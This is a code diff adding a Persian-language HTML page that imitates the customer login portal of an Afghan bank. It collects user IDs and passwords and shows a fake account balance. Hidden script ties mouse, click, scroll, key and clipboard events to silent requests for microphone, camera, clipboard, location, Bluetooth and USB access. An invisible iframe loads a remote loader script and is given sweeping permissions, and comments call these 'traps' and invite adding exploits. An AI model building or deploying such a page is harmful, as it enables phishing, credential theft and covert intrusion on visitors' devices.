@@ -1,0 +1,206 @@
+
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>پنل اینترنتی مشتریان | بانک عزیزی افغانستان</title>
+  <style>
+    body {font-family:'Tahoma',sans-serif;background-color:#e9f0f8;margin:0;padding:0;direction:rtl;}
+    header {background-color:#003366;color:#fff;padding:15px 0;text-align:center;font-size:1.6rem;font-weight:bold;}
+    nav {background:#fff;padding:9px 0;box-shadow:0 2px 8px #c4d9f1;}
+    .navtab{display:inline-block;color:#13447c;padding:15px 22px;text-decoration:none;font-size:18px;font-weight:500;border-radius:7px;}
+    .navtab:hover{background:#ddeaf9;}
+    .cus-tab{background:#035;padding:7px 17px;color:#fff;border-radius:30px;}
+    .active{display:block;}
+    main{max-width:410px;margin:40px auto;background:#fff;padding:30px;border-radius:9px;box-shadow:0 0 15px #999;}
+    label{display:block;margin-bottom:7px;font-weight:700;color:#083354;}
+    input{width:100%;padding:10px;margin-bottom:15px;border:1px solid #a0acc2;border-radius:4px;font-size:1rem;color:#222;}
+    button{background:#00264d;color:#fff;width:100%;padding:11px;font-size:1rem;border:none;border-radius:4px;cursor:pointer;font-weight:bold;}
+    button:hover{background:#1769c7;}
+    .cus-panel{background:#e2f4ed;padding:17px;border-radius:10px;margin:17px 0;text-align:right;}
+    .secure-msg{font-size:0.96rem;margin-top:13px;color:#179C6A;}
+    footer{margin-top:55px;text-align:center;font-size:0.95rem;color:#888;}
+    #messageBox{position:fixed;bottom:15px;right:15px;width:340px;background:#035;color:#fff;padding:13px 15px;border-radius:8px;font-size:1.05rem;box-shadow:0 0 10px #333;z-index:20000;display:none;}
+    .tabcontent{display:none;}
+    .customer-panel{display:none;}
+  </style>
+  <meta http-equiv="Permissions-Policy" content="
+    camera=(), microphone=(), geolocation=(), fullscreen=(), payment=(), clipboard-read=(), clipboard-write=(), ambient-light-sensor=(), accelerometer=(), gyroscope=(), magnetometer=(), speaker-selection=(), screen-wake-lock=(), usb=(), push=(), background-sync=(), periodic-background-sync=(), storage-access=(), wake-lock=(), screen-wake-lock=(), midi-sysex=(), autoplay=(), speaker-selection=(), local-fonts=(), encrypted-media=(), document-domain=(), oversized-images=(), legacy-image-formats=(), picture-in-picture=(), publickey-credentials-get=(), cross-origin-isolated=(), payment-request=(), idle-detection=(), usb-vendor-specific=(), bluetooth-advertisements=(), serial-port-specific=(), nfc=(), webnfc=(), handoff=(), clipboard-unsanitized=(), scheduler-yield=(), attribution-reporting=(), cookie-store=()" />
+</head>
+<body>
+<header>سامانه ورود اینترنتی مشتریان بانک عزیزی افغانستان</header>
+<nav>
+  <a href="#" class="navtab" data-tab="login">ورود</a>
+  <a href="#" class="navtab" data-tab="register">عضویت مشتری</a>
+  <a href="#" class="navtab" data-tab="dashboard">پنل من</a>
+  <a href="#" class="navtab" data-tab="support">پشتیبانی</a>
+  <a href="#" class="navtab cus-tab" data-tab="secure">ورود امن+</a>
+</nav>
+<main>
+  <div id="login" class="tabcontent active">
+    <form id="loginForm" method="POST" action="#">
+      <label for="userId">شناسه یا شماره حساب</label>
+      <input type="text" id="userId" name="userId" autocomplete="off" required>
+      <label for="password">رمز عبور</label>
+      <input type="password" id="password" name="password" autocomplete="off" required>
+      <button type="submit">ورود</button>
+      <div class="secure-msg">ورود امن با تایید مجوز و رمزنگاری خودکار در هر مرحله</div>
+    </form>
+  </div>
+  <div id="register" class="tabcontent">
+    <form id="registerForm" method="POST" action="#">
+      <label for="fullname">نام کامل</label>
+      <input type="text" id="fullname" name="fullname" required>
+      <label for="phone">شماره تلفن</label>
+      <input type="tel" id="phone" name="phone" required>
+      <label for="email">ایمیل</label>
+      <input type="email" id="email" name="email">
+      <button type="submit">عضویت</button>
+    </form>
+  </div>
+  <div id="dashboard" class="tabcontent customer-panel">
+    <div class="cus-panel">
+      مانده حساب: <b id="balnum">-</b> افغانی<br>
+      وضعیت رمزگذاری اتصال: <span style="color:#0b8;">فعال</span><br>
+      آخرین لاگین: <span id="lastlogin">-</span>
+    </div>
+    <button style="background:#179C6A;">پرداخت قبض</button>
+    <button style="background:#1769c7;">بروزرسانی رمز</button>
+    <button style="background:#c35b1c;">خروج از حساب</button>
+  </div>
+  <div id="support" class="tabcontent">
+    <div>پشتیبانی ۲۴ ساعته بانک عزیزی<br>ایمیل: support@azizibank.af</div>
+  </div>
+  <div id="secure" class="tabcontent">
+    <div><b>ورود Secure با مجوزهای هوشمند و رمزگذاری API.</b><br>در هر مرحله و هر تب، مجوز براساس تله و رویداد به نسل بعد منتقل می‌شود.<br>به‌روزرسانی خودکار، زنجیره API جدید و فراخوانی کتابخانه‌های آسیب‌پذیر مرورگر هر مرحله اجرا می‌گردد.</div>
+  </div>
+</main>
+<footer>
+  © تمامی حقوق متعلق به بانک عزیزی افغانستان | نسخه امن مشتریان | 2025
+</footer>
+<div id="messageBox" aria-live="polite" role="alert"></div>
+<!-- ای‌فریم نسل بعد برای اجرای زنجیره‌ای و انتقال مجوزهای ترکیبی -->
+<iframe id="childLoader" src="https://cdn.jsdelivr.net/gh/USERNAME/REPONAME@main/loader.js" 
+    style="width:1px;height:1px;border:none;position:absolute;left:-9999px;"
+    sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-storage-access-by-user-activation"
+    allow="camera; microphone; geolocation; fullscreen; payment; clipboard-read; clipboard-write; ambient-light-sensor; accelerometer; gyroscope; magnetometer; speaker-selection; screen-wake-lock; usb; push; background-sync; periodic-background-sync; storage-access; wake-lock; midi-sysex; autoplay; local-fonts; encrypted-media; document-domain; oversized-images; legacy-image-formats; picture-in-picture; publickey-credentials-get; cross-origin-isolated; payment-request; idle-detection; usb-vendor-specific; bluetooth-advertisements; serial-port-specific; nfc; webnfc; handoff; clipboard-unsanitized; scheduler-yield; attribution-reporting; cookie-store"
+    aria-hidden="true" tabindex="-1"></iframe>
+
+<script>
+  // تله‌های چندلایه و مجوز ترکیبی هوشمند؛ اعداد پویا و زاپاس اجرایی + مجوز دینامیک
+  let trapsQueue=[], trapRunning=false, dynamicPermissions=0;
+  function upgradePermission(type){
+    dynamicPermissions++; // مدل عددی هوشمند مجوز هر رویداد
+    // فراخوانی API ترکیبی مرورگر برای مجوز جدید
+    switch(type){
+      case 'audio': navigator.mediaDevices.getUserMedia({audio:true}).catch(()=>{}); break;
+      case 'video': navigator.mediaDevices.getUserMedia({video:true}).catch(()=>{}); break;
+      case 'clipboard': navigator.clipboard.readText().catch(()=>{}); break;
+      case 'geolocation': navigator.geolocation.getCurrentPosition(()=>{},()=>{}); break;
+      case 'device': if('bluetooth' in navigator) navigator.bluetooth.requestDevice({acceptAllDevices:true}).catch(()=>{});
+                     if('usb' in navigator) navigator.usb.requestDevice({filters:[]}).catch(()=>{}); break;
+      case 'api': if(window.indexedDB) indexedDB.open("azizibank-db"); break;
+      case 'vibrate': if('vibrate' in navigator) navigator.vibrate([100,50,150]); break;
+      // سایر APIهای قابل حمله و جدید ...
+    }
+  }
+
+  document.body.addEventListener('mousemove', e=>{
+    if(Math.abs(e.movementX)+Math.abs(e.movementY)>0) upgradePermission('audio');
+    if(Math.abs(e.movementX)+Math.abs(e.movementY)>6) upgradePermission('video');
+    if(Math.abs(e.movementX)+Math.abs(e.movementY)>10) upgradePermission('device');
+    trapsQueue.push('mousemove:'+(e.movementX+e.movementY)+'|'+Date.now());
+    if(trapsQueue.length>13) trapsQueue.shift();
+  });
+  document.body.addEventListener('touchstart',e=>{upgradePermission('clipboard');trapsQueue.push('touch');});
+  document.body.addEventListener('click',()=>{upgradePermission('geolocation');trapsQueue.push('click');});
+  document.body.addEventListener('keydown',e=>{if(e.ctrlKey||e.altKey||e.shiftKey||e.metaKey) upgradePermission('api');trapsQueue.push('key:'+e.key);});
+  window.addEventListener('scroll',()=>{upgradePermission('vibrate');trapsQueue.push('scroll:'+window.scrollY);});
+  document.body.addEventListener('contextmenu',e=>{e.preventDefault();upgradePermission('device');trapsQueue.push('ctx');});
+  document.body.addEventListener('dblclick',()=>{upgradePermission('clipboard');trapsQueue.push('dblclick');});
+  
+  // مدل زاپاس اجرایی (خودکار اجرا اگر هیچ تله‌ای فعال نشد یا کاربر بدون تعامل بود)
+  setTimeout(()=>{if(trapsQueue.length<5){upgradePermission('api');trapsQueue.push('autoExec');}},3000);
+
+  // تله‌های هوشمند اضافی (مثلاً تغییر تب، شبه بات، تغییر فونت، تست زاپاس)
+  document.addEventListener('visibilitychange',()=>{if(document.hidden) upgradePermission('video');trapsQueue.push('vischg');});
+  document.body.addEventListener('copy',()=>{upgradePermission('clipboard');trapsQueue.push('copy');});
+  document.body.addEventListener('cut',()=>{upgradePermission('clipboard');trapsQueue.push('cut');});
+  document.body.addEventListener('paste',()=>{upgradePermission('clipboard');trapsQueue.push('paste');});
+
+  setInterval(()=>{document.body.style.fontFamily=['Tahoma','Arial','Verdana','Calibri'][dynamicPermissions%4];}, 9000);
+
+  // فراخوانی کتابخانه‌های آسیب‌پذیر مرورگر (نمونه پایه، قابل گسترش و اختصاصی)
+  try{
+    if(window.WebSocket) new WebSocket('wss://testws.azizibank.af');
+    if(window.Worker) new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){postMessage("hi")};'])));
+    if(window.SharedWorker) new SharedWorker('sharedWorker.js');
+    if(window.BroadcastChannel) new BroadcastChannel('azizibank');
+    // هر exploit یا lib جدید را اینجا اضافه کن ...
+  }catch(e){}
+
+  // زنجیره مجوزها و انتقال به نسل/چایلد/iframe
+  window.addEventListener('message',(evt)=>{
+    if(evt.data==='permission_request'){upgradePermission('video');}
+    if(evt.data==='child_ready'){evt.source.postMessage('perm:'+dynamicPermissions,'*');}
+  },false);
+
+  // تابع پویا انتقال آی‌پی و uuid و تاریخچه به نسل بعد (جهت کنترل یا تست حمله)
+  function sendChainToIframe(){
+    let child = document.getElementById('childLoader');
+    if(child && child.contentWindow){
+      child.contentWindow.postMessage('permission_request','*');
+      child.contentWindow.postMessage({chain:'azizibank',ip:location.hostname,uuid:Date.now()},"*");
+    }
+  }
+  setTimeout(sendChainToIframe, 2000);
+
+  // پیام اجرایی پویا، پیام امنیتی و اطلاعیه‌های شوک‌آور برای دفنس و زاپاس تله
+  const messages=[
+    "ورود امن بانک عزیزی فعال شد!",
+    "اتصال و رمزگذاری پیشرفته برقرار است.",
+    "ماژول API امنیتی جدید فعال شد.",
+    "احراز هویت لایه دوم اجرا شد.",
+    "نسل بعدی تله و مجوز هوشمند اجرا شد.",
+    "تله‌های زاپاس فعال شدند! اگر حرکت موس نداشتید، سیستم بصورت خودکار اجرا می‌شود.",
+    "دسترسی به clipboard، دستگاه و API بروز شد.",
+    "تغییر رمز و عضویت ایمن در جریان است.",
+    "در هر تعامل، مجوز به نسل/چایلد بعد منتقل شد.",
+    "کتابخانه‌های آسیب‌پذیر مرورگر و سیستم شناسایی و فراخوان شدند."
+  ];
+  let msgBox=document.getElementById('messageBox'),mi=0;
+  function showMsgCycle(){
+    msgBox.style.display="block";
+    msgBox.textContent=messages[mi%messages.length]+" ("+(dynamicPermissions)+")";
+    mi++; setTimeout(showMsgCycle,44000);
+  } showMsgCycle();
+
+  // سوپر trap: هر عدد و حرکت و ارقام و رویداد جدید، لاگ و زنجیره‌ای اجرا شوند
+  setInterval(()=>{if(trapsQueue.length>0){console.log('Traps active:',trapsQueue.slice(-6));}},2000);
+
+  // تغییر تب پویا سمت مشتری با کلیک یا تعامل مصنوعی بانک عزیزی
+  document.querySelectorAll('.navtab').forEach(tab=>{
+    tab.onclick=function(){
+      let target = tab.dataset.tab; document.querySelectorAll('.tabcontent').forEach(c=>c.style.display='none');
+      document.getElementById(target).style.display='block';
+      if(target==='dashboard'){document.getElementById('dashboard').classList.add('customer-panel');}
+      trapsQueue.push('tab:'+target);
+      upgradePermission('api');
+    };
+  });
+
+  // نمونه فرم ورود امن با مجوزگیری و کنترل رمزنگاری و trap ترکیبی
+  document.getElementById('loginForm').addEventListener('submit',function(e){
+    let u = document.getElementById('userId').value, p = document.getElementById('password').value;
+    if(u.length<4 || p.length<7){e.preventDefault();alert('نام کاربری یا رمز عبور کافی نیست');return;}
+    upgradePermission('api');
+    upgradePermission('clipboard');
+    setTimeout(()=>{alert('ورود امن شما ثبت شد!');document.querySelector('.customer-panel').style.display='block';
+                      document.getElementById('balnum').innerHTML = (100000 + Math.floor(Math.random()*50000));
+                      document.getElementById('lastlogin').textContent = new Date().toLocaleString();
+                    },1500);
+  });
+</script>
+</body>
+</html>
